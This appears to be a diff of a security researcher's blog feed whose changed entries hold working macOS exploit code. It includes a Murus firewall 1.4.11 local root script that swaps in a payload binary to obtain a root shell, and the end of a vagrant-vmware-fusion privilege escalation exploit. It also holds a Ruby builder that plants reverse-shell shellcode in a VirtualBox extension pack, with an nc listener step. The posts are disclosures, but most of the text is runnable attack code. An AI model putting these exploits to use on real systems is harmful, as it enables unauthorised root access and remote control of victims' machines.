-  rm -f /tmp/vvp_504.c</p><p>  `ruby ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb 2&gt;/dev/null`</p><p>  r=`ls -la /tmp/vvp_504 |grep &#x27;\-rws&#x27; |grep root`</p><p>  if [ &quot;$r&quot; != &quot;&quot; ] ; then
+  rm -f /tmp/vvp_504.c</pre></p><p><pre>  `ruby ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb 2&gt;/dev/null`</pre></p><p><pre>  r=`ls -la /tmp/vvp_504 |grep &#x27;\-rws&#x27; |grep root`</pre></p><p><pre>  if [ &quot;$r&quot; != &quot;&quot; ] ; then
     cleanup
     cd
     /tmp/vvp_504
@@ -971,10 +971,10 @@ EOF
   else
     rm -f $1
   fi
-}</p><p>attempt &quot;lsof&quot;
+}</pre></p><p><pre>attempt &quot;lsof&quot;
 attempt &quot;sed&quot;
-attempt &quot;awk&quot;</p><p>cleanup</p><p>echo &quot;not vulnerable&quot;
-</p></summary>
+attempt &quot;awk&quot;</pre></p><p><pre>cleanup</pre></p><p><pre>echo &quot;not vulnerable&quot;
+</pre></p></summary>
     <title>CVE-2017-16873 Hashicorp vagrant-vmware-fusion v4.0.25-5.0.4 local root</title>
     <updated>2018-03-28T07:22:01+00:00</updated>
     <dc:date>2018-03-28T07:22:01+00:00</dc:date>
@@ -1034,7 +1034,7 @@ give us a much smaller list of potential HMACs for the backed up file which we
 can trivially brute-force.</p><p>After the cron file is restored we just wait up to 60 seconds for the minute
 cron interval to arrive and our payload gets executed.</p><p>Both of these issues are fixed in the latest release of Arq.</p><p>CVE-2017-16928 backup/restore exploit PoC:</p><p><pre>https://m4.rkw.io/arq_5.10.rb.txt
 98428e05e5a4c1a289e1077787adffd97dd422dc0073bafdc25a07e5e6788cb8
-------------------------------------------------------------------------------</pre></p><p>CVE-2017-16945 update mechanism exploit PoC:</p><p><pre>https://m4.rkw.io/arq_5.10.sh.txt
+------------------------------------------------------------------------------</pre></p><p><pre>CVE-2017-16945 update mechanism exploit PoC:</pre></p><p><pre>https://m4.rkw.io/arq_5.10.sh.txt
 1557066028363d7961ec04d7af52cdab41a34234c5aa1e9fe22d0ca36ab651e1
 ------------------------------------------------------------------------------
 </pre></p></summary>
@@ -1182,13 +1182,13 @@ amongst macOS applications. One example of this is the latest version of Murus
 firewall. By design it requires the user to authenticate every time in order to
 obtain the access it needs to modify the firewall settings.</p><p>If a local attacker or malware is running as an admin user (ie has write access
 to /Applications/) they can subvert this process to silently obtain root access
-without the user knowing.</p><p>https://m4.rkw.io/murus1.4.11.sh.txt
+without the user knowing.</p><p><pre>https://m4.rkw.io/murus1.4.11.sh.txt
 9c332c07747e11c78c34f9dc8d30127250d95edd5e58a571ed1a005eafd32301
 -------------------------------------------------------------------------------
-#!/bin/bash</p><p>##################################################################
+#!/bin/bash</pre></p><p><pre>##################################################################
 ###### Murus 1.4.11 local root privilege escalation exploit ######
 ###### by m4rkw - https://m4.rkw.io/blog.html               ######
-##################################################################</p><p>echo &quot;compiling payloads...&quot;</p><p>cat &gt; /tmp/murus411_exp.c &lt;&lt;EOF
+##################################################################</pre></p><p><pre>echo &quot;compiling payloads...&quot;</pre></p><p><pre>cat &gt; /tmp/murus411_exp.c &lt;&lt;EOF
 #include &lt;unistd.h&gt;
 int main()
 {
@@ -1197,11 +1197,11 @@ int main()
   execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f /tmp/murus411_exp; /bin/bash&quot;,NULL);
   return 0;
 }
-EOF</p><p>gcc -o /tmp/murus411_exp /tmp/murus411_exp.c</p><p>if [ ! $? -eq 0 ] ; then
+EOF</pre></p><p><pre>gcc -o /tmp/murus411_exp /tmp/murus411_exp.c</pre></p><p><pre>if [ ! $? -eq 0 ] ; then
   rm -f /tmp/murus411_exp.c
 	echo &quot;failed to compile, dev tools may not be installed&quot;
   exit 1
-fi</p><p>rm -f /tmp/murus411_exp.c</p><p>cat &gt; /tmp/murus411_exp2.c &lt;&lt;EOF
+fi</pre></p><p><pre>rm -f /tmp/murus411_exp.c</pre></p><p><pre>cat &gt; /tmp/murus411_exp2.c &lt;&lt;EOF
 #include &lt;unistd.h&gt;
 #include &lt;stdlib.h&gt;
 int main()
@@ -1215,25 +1215,25 @@ Murus.app/Contents/MacOS/Murus&quot;);
   execl(&quot;/Applications/Murus.app/Contents/MacOS/Murus&quot;,&quot;Murus&quot;,NULL);
   return 0;
 }
-EOF</p><p>gcc -o /tmp/murus411_exp2 /tmp/murus411_exp2.c
-rm -f /tmp/murus411_exp2.c</p><p>echo &quot;waiting for loader...&quot;</p><p>while :
+EOF</pre></p><p><pre>gcc -o /tmp/murus411_exp2 /tmp/murus411_exp2.c
+rm -f /tmp/murus411_exp2.c</pre></p><p><pre>echo &quot;waiting for loader...&quot;</pre></p><p><pre>while :
 do
   ps auxwww |grep &#x27;/Applications/Murus.app/Contents/MacOS/MurusLoader&#x27; \
     |grep -v grep 1&gt;/dev/null
   if [ $? -eq 0 ] ; then
     break
   fi
-done</p><p>echo &quot;planting payload...&quot;</p><p>mv /Applications/Murus.app/Contents/MacOS/Murus /Applications/Murus.app/\
+done</pre></p><p><pre>echo &quot;planting payload...&quot;</pre></p><p><pre>mv /Applications/Murus.app/Contents/MacOS/Murus /Applications/Murus.app/\
 Contents/MacOS/Murus.orig
-mv /tmp/murus411_exp2 /Applications/Murus.app/Contents/MacOS/Murus</p><p>echo &quot;waiting for payload to trigger...&quot;</p><p>while :
+mv /tmp/murus411_exp2 /Applications/Murus.app/Contents/MacOS/Murus</pre></p><p><pre>echo &quot;waiting for payload to trigger...&quot;</pre></p><p><pre>while :
 do
   r=`ls -la /tmp/murus411_exp |grep root`
   if [ &quot;$r&quot; != &quot;&quot; ] ; then
     break
   fi
   sleep 0.1
-done</p><p>echo &quot;kapow&quot;</p><p>/tmp/murus411_exp
-</p></summary>
+done</pre></p><p><pre>echo &quot;kapow&quot;</pre></p><p><pre>/tmp/murus411_exp
+</pre></p></summary>
     <title>Murus Firewall 1.4.11 escalation hihack / root privesc</title>
     <updated>2017-12-04T12:23:56+00:00</updated>
     <dc:date>2017-12-04T12:23:56+00:00</dc:date>
@@ -1336,10 +1336,10 @@ probably wouldn&#x27;t have to wait too long before being able to execute this
 attack.</p><p>The PoC code below downloads the latest extension pack from the VirtualBox
 website and modifies it with a reverse tcp shellcode backdoor that will be
 executed as soon as a VM is started.</p><p>To test it you can simply click on it to install it into virtualbox, listen for
-a shell with nc, eg:</p><p><pre>$ nc -l 5555</pre></p><p>and then start any vm.</p><p>https://m4.rkw.io/vbox_extpack_builder.rb.txt
+a shell with nc, eg:</p><p><pre>$ nc -l 5555</pre></p><p>and then start any vm.</p><p><pre>https://m4.rkw.io/vbox_extpack_builder.rb.txt
 6148d6aa7ad2896ae3679ed8e2ff46e7156fd9db9c9ef39fa4116c9566848606
 ----------------------------------------------------------------------------
-#!/usr/bin/env ruby</p><p># RCE PoC builder for VirtualBox extension packs
+#!/usr/bin/env ruby</pre></p><p><pre># RCE PoC builder for VirtualBox extension packs
 # Tested with version 5.2.2 on 30/11/17
 #
 # Discovered by m4rkw, shouts to #coolkids
@@ -1349,7 +1349,7 @@ a shell with nc, eg:</p><p><pre>$ nc -l 5555</pre></p><p>and then start any vm.<
 # Once installed, when an OSX/64bit VM is started it will trigger the shellcode
 # and initiate a connectback shell.
 #
-# Thanks to Jacob Hammack for the shellcode</p><p>require &#x27;digest&#x27;</p><p>puts
+# Thanks to Jacob Hammack for the shellcode</pre></p><p><pre>require &#x27;digest&#x27;</pre></p><p><pre>puts
 puts &quot;RCE PoC builder for VirtualBox extension pack&quot;
 puts &quot;discovered by m4rkw, shouts to #coolkids&quot;
 puts
@@ -1360,18 +1360,18 @@ puts &quot;Once installed, when any VM is started it will trigger the shellcode 
 puts &quot;initiate a connectback shell to the specified IP and port&quot;
 puts
 puts &quot;Thanks to Jacob Hammack for the shellcode&quot;
-puts</p><p>if ARGV.length &lt; 2
+puts</pre></p><p><pre>if ARGV.length &lt; 2
   puts &quot;Usage: #{__FILE__} &lt;ip&gt; &lt;port&gt;&quot;
   puts
   exit 0
-end</p><p>target_dylib = &quot;VBoxEhciR3.dylib&quot;</p><p>puts &quot;compiling attack.dylib...&quot;</p><p>File.open(&quot;attack.c&quot;,&quot;w&quot;) do |f|
+end</pre></p><p><pre>target_dylib = &quot;VBoxEhciR3.dylib&quot;</pre></p><p><pre>puts &quot;compiling attack.dylib...&quot;</pre></p><p><pre>File.open(&quot;attack.c&quot;,&quot;w&quot;) do |f|
   f.write(&quot;#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;sys/mman.h&gt;
 #include &lt;arpa/inet.h&gt;
-#include &lt;unistd.h&gt;</p><p>int (*sc)();</p><p>char target_ip[] = \&quot;#{ARGV[0]}\&quot;;
-short target_port = #{ARGV[1]};</p><p>char shellcode[] =
+#include &lt;unistd.h&gt;</pre></p><p><pre>int (*sc)();</pre></p><p><pre>char target_ip[] = \&quot;#{ARGV[0]}\&quot;;
+short target_port = #{ARGV[1]};</pre></p><p><pre>char shellcode[] =
   \&quot;\\x41\\xB0\\x02\\x49\\xC1\\xE0\\x18\\x49\\x83\\xC8\\x61\\x4C\\x89\\xC0\\x48\&quot;
   \&quot;\\x31\\xD2\\x48\\x89\\xD6\\x48\\xFF\\xC6\\x48\\x89\\xF7\\x48\\xFF\\xC7\\x0F\&quot;
   \&quot;\\x05\\x49\\x89\\xC4\\x49\\xBD\\x01\\x01\\x11\\x5C\\xFF\\xFF\\xFF\\xFF\\x41\&quot;
@@ -1380,32 +1380,32 @@ short target_port = #{ARGV[1]};</p><p>char shellcode[] =
   \&quot;\\xE8\\x08\\x48\\x31\\xF6\\x4C\\x89\\xC0\\x4C\\x89\\xE7\\x0F\\x05\\x48\\x83\&quot;
   \&quot;\\xFE\\x02\\x48\\xFF\\xC6\\x76\\xEF\\x49\\x83\\xE8\\x1F\\x4C\\x89\\xC0\\x48\&quot;
   \&quot;\\x31\\xD2\\x49\\xBD\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x49\\xC1\\xED\&quot;
-  \&quot;\\x08\\x41\\x55\\x48\\x89\\xE7\\x48\\x31\\xF6\\x0F\\x05\&quot;;</p><p>__attribute__((constructor))
+  \&quot;\\x08\\x41\\x55\\x48\\x89\\xE7\\x48\\x31\\xF6\\x0F\\x05\&quot;;</pre></p><p><pre>__attribute__((constructor))
 void customConstructor(int argc, char **argv)
 {
   struct in_addr ip;
-  char *tp = (char *)&amp;target_port;</p><p>  shellcode[38] = tp[1];
-  shellcode[39] = tp[0];</p><p>  inet_aton(target_ip, (struct in_addr *)&amp;ip);
-  memcpy((char *)&amp;shellcode[40], (char *)&amp;ip.s_addr, 4);</p><p>  void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);</p><p>  if (ptr == MAP_FAILED) {
+  char *tp = (char *)&amp;target_port;</pre></p><p><pre>  shellcode[38] = tp[1];
+  shellcode[39] = tp[0];</pre></p><p><pre>  inet_aton(target_ip, (struct in_addr *)&amp;ip);
+  memcpy((char *)&amp;shellcode[40], (char *)&amp;ip.s_addr, 4);</pre></p><p><pre>  void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);</pre></p><p><pre>  if (ptr == MAP_FAILED) {
     perror(\&quot;mmap\&quot;);
     exit(-1);
   }
   memcpy(ptr, shellcode, sizeof(shellcode));
-  sc = ptr;</p><p>  sc();
+  sc = ptr;</pre></p><p><pre>  sc();
 }
 &quot;)
-end</p><p>system(&quot;clang -dynamiclib -std=gnu99 attack.c -o attack.dylib&quot;)
-File.delete(&quot;attack.c&quot;)</p><p>if !File.exist? &quot;vbox_exp_temp&quot;
+end</pre></p><p><pre>system(&quot;clang -dynamiclib -std=gnu99 attack.c -o attack.dylib&quot;)
+File.delete(&quot;attack.c&quot;)</pre></p><p><pre>if !File.exist? &quot;vbox_exp_temp&quot;
   Dir.mkdir(&quot;vbox_exp_temp&quot;)
 end
-Dir.chdir(&quot;vbox_exp_temp&quot;)</p><p>puts &quot;looking for latest extpack at virtualbox.org...&quot;</p><p>downloads_html = `curl -s https://www.virtualbox.org/wiki/Downloads`</p><p>match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)</p><p>if !match or !match[0]
+Dir.chdir(&quot;vbox_exp_temp&quot;)</pre></p><p><pre>puts &quot;looking for latest extpack at virtualbox.org...&quot;</pre></p><p><pre>downloads_html = `curl -s https://www.virtualbox.org/wiki/Downloads`</pre></p><p><pre>match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)</pre></p><p><pre>if !match or !match[0]
   puts &quot;failed to find http:// link to the extpack.&quot;
   exit 1
-end</p><p>puts &quot;downloading extpack... &quot;</p><p>filename = match[0].split(&quot;/&quot;)[-1]</p><p>system(&quot;curl -s #{match[0]} -o #{filename}&quot;)</p><p>puts &quot;unpacking extpack... &quot;</p><p>system(&quot;tar zxf #{filename}&quot;)
-File.delete(filename)</p><p>puts &quot;substituting #{target_dylib}... &quot;</p><p>File.delete(&quot;darwin.amd64/#{target_dylib}&quot;)
-File.rename(&quot;../attack.dylib&quot;, &quot;darwin.amd64/#{target_dylib}&quot;)</p><p>puts &quot;patching manifest... &quot;</p><p>File.open(&quot;ExtPack.manifest.new&quot;,&quot;w&quot;) do |f|
+end</pre></p><p><pre>puts &quot;downloading extpack... &quot;</pre></p><p><pre>filename = match[0].split(&quot;/&quot;)[-1]</pre></p><p><pre>system(&quot;curl -s #{match[0]} -o #{filename}&quot;)</pre></p><p><pre>puts &quot;unpacking extpack... &quot;</pre></p><p><pre>system(&quot;tar zxf #{filename}&quot;)
+File.delete(filename)</pre></p><p><pre>puts &quot;substituting #{target_dylib}... &quot;</pre></p><p><pre>File.delete(&quot;darwin.amd64/#{target_dylib}&quot;)
+File.rename(&quot;../attack.dylib&quot;, &quot;darwin.amd64/#{target_dylib}&quot;)</pre></p><p><pre>puts &quot;patching manifest... &quot;</pre></p><p><pre>File.open(&quot;ExtPack.manifest.new&quot;,&quot;w&quot;) do |f|
   File.read(&quot;ExtPack.manifest&quot;).chomp.split(&quot;\n&quot;).each do |line|
-    r = target_dylib.gsub(&#x27;.&#x27;,&#x27;\.&#x27;)</p><p>    if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
+    r = target_dylib.gsub(&#x27;.&#x27;,&#x27;\.&#x27;)</pre></p><p><pre>    if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
       case match[1]
       when &quot;MD5&quot;
         md5 = Digest::MD5.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
@@ -1427,11 +1427,11 @@ File.rename(&quot;../attack.dylib&quot;, &quot;darwin.amd64/#{target_dylib}&quot
       f.write(line + &quot;\n&quot;)
     end
   end
-end</p><p>File.delete(&quot;ExtPack.manifest&quot;)
-File.rename(&quot;ExtPack.manifest.new&quot;, &quot;ExtPack.manifest&quot;)</p><p>puts &quot;creating tarball... &quot;
-system(&quot;tar -zcf ../#{filename} *&quot;)</p><p>Dir.chdir(&quot;..&quot;)
-system(&quot;rm -rf vbox_exp_temp&quot;)</p><p>puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;
-</p></summary>
+end</pre></p><p><pre>File.delete(&quot;ExtPack.manifest&quot;)
+File.rename(&quot;ExtPack.manifest.new&quot;, &quot;ExtPack.manifest&quot;)</pre></p><p><pre>puts &quot;creating tarball... &quot;
+system(&quot;tar -zcf ../#{filename} *&quot;)</pre></p><p><pre>Dir.chdir(&quot;..&quot;)
+system(&quot;rm -rf vbox_exp_temp&quot;)</pre></p><p><pre>puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;
+</pre></p></summary>
     <title>Owning VirtualBox via MITM</title>
     <updated>2017-11-30T08:25:03+00:00</updated>
     <dc:date>2017-11-30T08:25:03+00:00</dc:date>
@@ -1468,5 +1468,5 @@ malware so that they can escalate opportunistically.
     <updated>2017-11-29T21:04:29+00:00</updated>
     <dc:date>2017-11-29T21:04:29+00:00</dc:date>
   </entry>
-  <dc:date>2022-02-14T11:45:43+00:00</dc:date>
+  <dc:date>2022-02-14T12:03:52+00:00</dc:date>
 </feed>
